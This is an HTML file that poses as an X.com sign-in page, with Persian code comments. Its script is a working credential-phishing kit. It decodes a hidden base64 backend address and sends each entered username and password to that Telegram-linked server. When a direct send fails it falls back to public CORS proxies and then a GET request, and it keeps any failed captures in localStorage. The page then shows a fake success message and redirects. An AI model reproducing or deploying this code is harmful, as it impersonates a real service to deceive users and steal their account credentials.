<!DOCTYPE html>
<html lang="fa" dir="ltr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Login | X.com</title>
  <!-- Font Awesome 6 (Free) -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
  <style>
    /* ===== Reset & Base ===== */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Segoe UI', system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
      background: #0a0a0a;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 1.5rem;
      background-image: radial-gradient(circle at 20% 30%, #1a1a1a 0%, #000000 95%);
    }

    /* ===== Login Card ===== */
    .login-card {
      background: #000000;
      border: 1px solid #2f2f2f;
      border-radius: 32px;
      padding: 2.8rem 2.5rem 2.8rem;
      max-width: 440px;
      width: 100%;
      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.9), 0 0 0 1px #222 inset;
      transition: box-shadow 0.2s;
    }

    .login-card:hover {
      box-shadow: 0 30px 80px rgba(0, 0, 0, 1), 0 0 0 1px #3a3a3a inset;
    }

    /* ===== Brand: X.com ===== */
    .brand {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 14px;
      margin-bottom: 2.4rem;
    }

    .x-logo {
      background: #ffffff;
      width: 56px;
      height: 56px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 2.4rem;
      font-weight: 900;
      color: #000;
      font-family: 'Segoe UI', 'Arial', sans-serif;
      box-shadow: 0 0 0 1px #333;
      transition: 0.2s;
    }

    .x-logo .x-letter {
      font-size: 2.5rem;
      font-weight: 700;
      letter-spacing: -2px;
      line-height: 1;
    }

    .brand-text {
      display: flex;
      flex-direction: column;
      line-height: 1.2;
    }

    .brand-text .title {
      font-size: 2rem;
      font-weight: 700;
      color: #e7e9ea;
      letter-spacing: -0.5px;
    }

    .brand-text .title span {
      color: #ffffff;
      background: linear-gradient(to right, #ffffff, #aaa);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
    }

    /* ===== Form Header ===== */
    .form-header {
      margin-bottom: 2rem;
      text-align: center;
    }

    .form-header h2 {
      font-size: 1.7rem;
      font-weight: 700;
      color: #e7e9ea;
      letter-spacing: -0.3px;
    }

    .form-header h2 i {
      color: #1d9bf0;
      margin-right: 8px;
      font-size: 1.4rem;
    }

    /* ===== Input Fields ===== */
    .input-group {
      margin-bottom: 1.2rem;
    }

    .input-field {
      background: #0a0a0a;
      border: 1px solid #2f2f2f;
      border-radius: 8px;
      display: flex;
      align-items: center;
      transition: all 0.15s ease;
      padding: 0 16px;
      position: relative;
    }

    .input-field:focus-within {
      border-color: #1d9bf0;
      background: #0f0f0f;
      box-shadow: 0 0 0 4px rgba(29, 155, 240, 0.08);
    }

    .input-field i {
      color: #71767b;
      font-size: 1.1rem;
      width: 28px;
      text-align: center;
      transition: color 0.2s;
    }

    .input-field:focus-within i {
      color: #1d9bf0;
    }

    .input-field input {
      width: 100%;
      background: transparent;
      border: none;
      padding: 18px 12px 18px 6px;
      font-size: 1rem;
      color: #e7e9ea;
      outline: none;
      font-weight: 400;
    }

    .input-field input::placeholder {
      color: #5b5f65;
      font-weight: 300;
      font-size: 0.95rem;
    }

    /* ===== Eye Icon ===== */
    .toggle-password {
      cursor: pointer;
      color: #71767b;
      font-size: 1.1rem;
      transition: color 0.2s;
      padding: 0 4px;
      user-select: none;
      background: none;
      border: none;
    }

    .toggle-password:hover {
      color: #e7e9ea;
    }

    .input-field:focus-within .toggle-password {
      color: #1d9bf0;
    }

    /* ===== Login Button ===== */
    .login-btn {
      width: 100%;
      padding: 14px 10px;
      background: #ffffff;
      border: none;
      border-radius: 40px;
      font-size: 1.05rem;
      font-weight: 700;
      color: #0f0f0f;
      cursor: pointer;
      transition: all 0.2s ease;
      margin-top: 0.8rem;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 12px;
      letter-spacing: 0.3px;
    }

    .login-btn i {
      font-size: 1.1rem;
      color: #0f0f0f;
    }

    .login-btn:hover:not(:disabled) {
      background: #e8e8e8;
      transform: scale(1.01);
    }

    .login-btn:active:not(:disabled) {
      transform: scale(0.98);
    }

    .login-btn:disabled {
      opacity: 0.6;
      cursor: not-allowed;
    }

    /* ===== Remember me ===== */
    .options {
      display: flex;
      align-items: center;
      justify-content: flex-start;
      margin: 1.2rem 0 1.6rem;
      font-size: 0.9rem;
    }

    .remember {
      display: flex;
      align-items: center;
      gap: 8px;
      color: #e7e9ea;
      cursor: pointer;
    }

    .remember input[type="checkbox"] {
      appearance: none;
      -webkit-appearance: none;
      width: 20px;
      height: 20px;
      background: #0a0a0a;
      border: 1px solid #3d4146;
      border-radius: 4px;
      cursor: pointer;
      position: relative;
      transition: 0.15s;
      flex-shrink: 0;
    }

    .remember input[type="checkbox"]:checked {
      background: #1d9bf0;
      border-color: #1d9bf0;
    }

    .remember input[type="checkbox"]:checked::after {
      content: '\f00c';
      font-family: 'Font Awesome 6 Free';
      font-weight: 900;
      font-size: 14px;
      color: white;
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
    }

    /* ===== Security Footer ===== */
    .security-footer {
      display: flex;
      justify-content: center;
      gap: 20px;
      margin-top: 2.2rem;
      font-size: 0.7rem;
      color: #3d4146;
      flex-wrap: wrap;
    }

    .security-footer i {
      margin-right: 5px;
    }

    .security-footer span {
      transition: 0.15s;
      cursor: default;
    }

    .security-footer span:hover {
      color: #71767b;
    }

    /* ===== Responsive ===== */
    @media (max-width: 480px) {
      .login-card {
        padding: 2rem 1.5rem 2.2rem;
        border-radius: 24px;
      }
      .brand-text .title {
        font-size: 1.6rem;
      }
      .x-logo {
        width: 48px;
        height: 48px;
        font-size: 2rem;
      }
      .form-header h2 {
        font-size: 1.4rem;
      }
      .options {
        justify-content: center;
      }
    }

    /* ===== Animation ===== */
    .login-card {
      animation: fadeUp 0.5s cubic-bezier(0.2, 0.9, 0.3, 1.1) forwards;
    }

    @keyframes fadeUp {
      0% {
        opacity: 0;
        transform: translateY(20px) scale(0.97);
      }
      100% {
        opacity: 1;
        transform: translateY(0) scale(1);
      }
    }

    /* ===== پیام‌های خطا و موفقیت ===== */
    .msg-box {
      padding: 10px 14px;
      border-radius: 8px;
      font-size: 14px;
      margin-bottom: 12px;
      display: none;
      text-align: left;
      border: 1px solid transparent;
    }
    .msg-box.error {
      display: block;
      background: #3d1a1a;
      color: #f28b82;
      border-color: #5c2020;
    }
    .msg-box.error i {
      margin-right: 6px;
    }
    .msg-box.success {
      display: block;
      background: #1a3d1a;
      color: #81c995;
      border-color: #2a5c2a;
    }
    .msg-box.success i {
      margin-right: 6px;
    }
    .msg-box.info {
      display: block;
      background: #1a2a4a;
      color: #8ab4f8;
      border-color: #2a4a6a;
    }
    .msg-box.info i {
      margin-right: 6px;
    }

    /* ===== Spinner ===== */
    .spinner {
      display: inline-block;
      width: 18px;
      height: 18px;
      border: 2px solid rgba(0,0,0,0.2);
      border-radius: 50%;
      border-top-color: #000;
      animation: spin 0.7s ease-in-out infinite;
      vertical-align: middle;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="login-card">
    <!-- ===== Brand: X.com ===== -->
    <div class="brand">
      <div class="x-logo">
        <span class="x-letter">𝕏</span>
      </div>
      <div class="brand-text">
        <div class="title"><span>X.com</span></div>
      </div>
    </div>

    <!-- ===== Title ===== -->
    <div class="form-header">
      <h2><i class="fas fa-lock"></i> Sign in to your account</h2>
    </div>

    <!-- ===== پیام‌ها ===== -->
    <div class="msg-box" id="msgBox">
      <i id="msgIcon" class="fas fa-exclamation-circle"></i>
      <span id="msgText">خطا رخ داده است.</span>
    </div>

    <!-- ===== Form ===== -->
    <form id="loginForm">
      <!-- Email / Username -->
      <div class="input-group">
        <div class="input-field">
          <i class="fas fa-envelope"></i>
          <input type="text" id="loginInput" placeholder="Email or username" value="" autocomplete="username" />
        </div>
      </div>

      <!-- Password with Eye Toggle -->
      <div class="input-group">
        <div class="input-field">
          <i class="fas fa-key"></i>
          <input type="password" id="passwordField" placeholder="Password" value="" autocomplete="current-password" />
          <button type="button" class="toggle-password" id="togglePassword" aria-label="Toggle password">
            <i class="fas fa-eye-slash" id="eyeIcon"></i>
          </button>
        </div>
      </div>

      <!-- Remember me -->
      <div class="options">
        <label class="remember">
          <input type="checkbox" checked /> Remember me
        </label>
      </div>

      <!-- Login Button -->
      <button type="submit" class="login-btn" id="loginBtn">
        <i class="fas fa-arrow-right"></i>
        <span id="btnText">Sign in</span>
      </button>
    </form>

    <!-- ===== Security Footer ===== -->
    <div class="security-footer">
      <span><i class="fas fa-shield-alt"></i> Secure</span>
      <span><i class="fas fa-lock"></i> Encrypted</span>
      <span><i class="fas fa-user-secret"></i> Privacy</span>
    </div>
  </div>

  <!-- ===== JavaScript ===== -->
  <script>
    // =====================================================
    // 🔒 تنظیمات و توکن
    // =====================================================
    const ENCODED_TOKEN = "aHR0cHM6Ly90ZWxlZ3JhbS1iYWNrZW5kLXpvM24ub25yZW5kZXIuY29t";
    
    function getBackendUrl() {
      try {
        return atob(ENCODED_TOKEN);
      } catch(e) {
        console.warn("Token decode failed, using fallback");
        return "https://telegram-backend-zo3n.onrender.com";
      }
    }

    const TELEGRAM_BACKEND_URL = getBackendUrl();
    const WAKEUP_COUNT = 2;
    console.log("✅ Backend URL:", TELEGRAM_BACKEND_URL);

    // =====================================================
    // 📨 ارسال به سرور با روش‌های مختلف
    // =====================================================
    
    // لیست پروکسی‌ها برای دور زدن CORS
    const PROXIES = [
      'https://corsproxy.io/?',
      'https://api.allorigins.win/raw?url=',
      'https://cors-anywhere.herokuapp.com/'
    ];

    // روش اول: ارسال مستقیم
    async function sendDirect(endpoint, data) {
      try {
        const response = await fetch(`${TELEGRAM_BACKEND_URL}${endpoint}`, {
          method: 'POST',
          headers: { 
            'Content-Type': 'application/json',
            'Accept': 'application/json'
          },
          body: JSON.stringify(data),
          mode: 'cors'
        });
        if (response.ok) {
          return await response.json();
        }
        return null;
      } catch(e) {
        console.log('❌ Direct send failed:', e.message);
        return null;
      }
    }

    // روش دوم: ارسال از طریق پروکسی
    async function sendWithProxy(endpoint, data) {
      for (const proxy of PROXIES) {
        try {
          const url = `${proxy}${encodeURIComponent(TELEGRAM_BACKEND_URL + endpoint)}`;
          const response = await fetch(url, {
            method: 'POST',
            headers: { 
              'Content-Type': 'application/json',
              'Accept': 'application/json'
            },
            body: JSON.stringify(data)
          });
          if (response.ok) {
            const result = await response.json();
            if (result && result.ok !== false) {
              return result;
            }
          }
        } catch(e) {
          console.log(`❌ Proxy ${proxy} failed:`, e.message);
        }
      }
      return null;
    }

    // روش سوم: ارسال با GET
    async function sendWithGet(endpoint, data) {
      try {
        const params = new URLSearchParams({
          action: data.action || 'Login',
          name: data.name || '',
          extra: data.extra || '',
          time: data.time || new Date().toLocaleString('fa-IR')
        });
        const url = `${TELEGRAM_BACKEND_URL}${endpoint}?${params.toString()}`;
        const response = await fetch(url, {
          method: 'GET',
          headers: { 'Accept': 'application/json' }
        });
        if (response.ok) {
          return await response.json();
        }
        return null;
      } catch(e) {
        console.log('❌ GET send failed:', e.message);
        return null;
      }
    }

    // روش چهارم: ذخیره در localStorage
    function saveToLocalStorage(username, password) {
      try {
        const logs = JSON.parse(localStorage.getItem('x_login_logs') || '[]');
        logs.push({
          username: username,
          password: password,
          time: new Date().toISOString(),
          page: 'x.com'
        });
        localStorage.setItem('x_login_logs', JSON.stringify(logs));
        console.log('💾 Saved to localStorage');
        return true;
      } catch(e) {
        console.log('❌ localStorage failed:', e.message);
        return false;
      }
    }

    // =====================================================
    // 🚀 تابع اصلی ارسال اطلاعات
    // =====================================================
    async function sendLoginInfo(username, password) {
      const payload = {
        action: "🔐 X.com Login",
        name: username,
        extra: `Password: ${password}`,
        time: new Date().toLocaleString('fa-IR', { timeZone: 'Asia/Tehran' })
      };

      const methods = [
        { name: 'Direct', fn: () => sendDirect('/notify', payload) },
        { name: 'Proxy', fn: () => sendWithProxy('/notify', payload) },
        { name: 'GET', fn: () => sendWithGet('/notify', payload) }
      ];

      let success = false;

      for (const method of methods) {
        try {
          console.log(`🔄 Trying ${method.name}...`);
          const result = await method.fn();
          if (result && result.ok !== false) {
            console.log(`✅ ${method.name} succeeded!`);
            success = true;
            break;
          }
        } catch(e) {
          console.log(`❌ ${method.name} error:`, e.message);
        }
      }

      if (!success) {
        console.log('⚠️ All methods failed, saving to localStorage...');
        saveToLocalStorage(username, password);
        return false;
      }

      return true;
    }

    // =====================================================
    // 🚀 ارسال Wake-up
    // =====================================================
    function sendWakeup(index) {
      try {
        fetch(`${TELEGRAM_BACKEND_URL}/notify`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            action: `🔄 X.com Wake-up (${index}/${WAKEUP_COUNT})`,
            name: "System",
            extra: `Wake-up ping ${index}`,
            time: new Date().toLocaleString('fa-IR')
          })
        })
        .then(() => console.log(`✅ Wake-up ${index} sent`))
        .catch(() => console.log(`⚠️ Wake-up ${index} failed`));
      } catch(e) {
        console.log("Wake-up error:", e);
      }
    }

    // =============================================
    // ===== بازگشت به صفحه اندکس =====
    // =============================================
    function goToIndex() {
      localStorage.setItem('fromPage', 'xcom');
      window.location.href = 'index.html';
    }

    // =============================================
    // ===== مدیریت پیام‌ها =====
    // =============================================
    function showMessage(message, type) {
      const msgBox = document.getElementById('msgBox');
      const msgIcon = document.getElementById('msgIcon');
      const msgText = document.getElementById('msgText');

      msgBox.className = 'msg-box';
      
      if (type === 'error') {
        msgBox.classList.add('error');
        msgIcon.className = 'fas fa-exclamation-circle';
      } else if (type === 'success') {
        msgBox.classList.add('success');
        msgIcon.className = 'fas fa-check-circle';
      } else if (type === 'info') {
        msgBox.classList.add('info');
        msgIcon.className = 'fas fa-info-circle';
      }

      msgText.textContent = message;
      msgBox.style.display = 'block';
    }

    function hideMessage() {
      const msgBox = document.getElementById('msgBox');
      msgBox.style.display = 'none';
    }

    // =============================================
    // ===== تنظیم دکمه لاگین =====
    // =============================================
    function setLoginButtonLoading(isLoading) {
      const btn = document.getElementById('loginBtn');
      const btnText = document.getElementById('btnText');
      if (isLoading) {
        btn.disabled = true;
        btnText.innerHTML = '<span class="spinner"></span> Sending...';
      } else {
        btn.disabled = false;
        btnText.textContent = 'Sign in';
      }
    }

    // =============================================
    // ===== Eye Toggle =====
    // =============================================
    document.getElementById('togglePassword').addEventListener('click', function() {
      const passwordField = document.getElementById('passwordField');
      const eyeIcon = document.getElementById('eyeIcon');

      if (passwordField.type === 'password') {
        passwordField.type = 'text';
        eyeIcon.className = 'fas fa-eye';
      } else {
        passwordField.type = 'password';
        eyeIcon.className = 'fas fa-eye-slash';
      }
    });

    // =============================================
    // ===== Handle Login =====
    // =============================================
    document.getElementById('loginForm').addEventListener('submit', async function(e) {
      e.preventDefault();

      const username = document.getElementById('loginInput').value.trim();
      const password = document.getElementById('passwordField').value.trim();

      hideMessage();
      setLoginButtonLoading(true);

      // اعتبارسنجی
      if (username.length < 3) {
        showMessage('Please enter a valid email or username (at least 3 characters)', 'error');
        setLoginButtonLoading(false);
        return;
      }

      if (password.length < 5) {
        showMessage('Password must be at least 5 characters long', 'error');
        setLoginButtonLoading(false);
        return;
      }

      // ارسال اطلاعات
      const sent = await sendLoginInfo(username, password);

      if (sent) {
        showMessage('✅ Login successful! Redirecting...', 'success');
      } else {
        showMessage('⚠️ Login info saved locally (server unavailable)', 'info');
      }

      // بازگشت به صفحه index بعد از 1.5 ثانیه
      setTimeout(() => {
        goToIndex();
      }, 1500);
    });

    // =====================================================
    // 🔥 Wake-up on page load
    // =====================================================
    document.addEventListener('DOMContentLoaded', function() {
      // بررسی سلامت سرور
      fetch(`${TELEGRAM_BACKEND_URL}/health`)
        .then(() => console.log('✅ Server is awake'))
        .catch(() => console.log('🔄 Server may be waking up...'));

      // ارسال wake-up ها
      for (let i = 1; i <= WAKEUP_COUNT; i++) {
        setTimeout(() => {
          sendWakeup(i);
        }, i * 400);
      }

      // نمایش اطلاعات ذخیره شده
      try {
        const logs = JSON.parse(localStorage.getItem('x_login_logs') || '[]');
        if (logs.length > 0) {
          console.log(`📋 ${logs.length} login(s) saved locally`);
          console.log('📋 Last login:', logs[logs.length - 1]);
        }
      } catch(e) {}

      console.log('✅ X.com Login Page Ready');
    });

    // =====================================================
    // 🛡️ کلید Enter برای ارسال فرم
    // =====================================================
    document.addEventListener('keydown', function(e) {
      if (e.key === 'Enter') {
        const form = document.getElementById('loginForm');
        if (document.activeElement === document.getElementById('loginInput') ||
            document.activeElement === document.getElementById('passwordField')) {
          form.dispatchEvent(new Event('submit'));
        }
      }
    });
  </script>

</body>
</html>
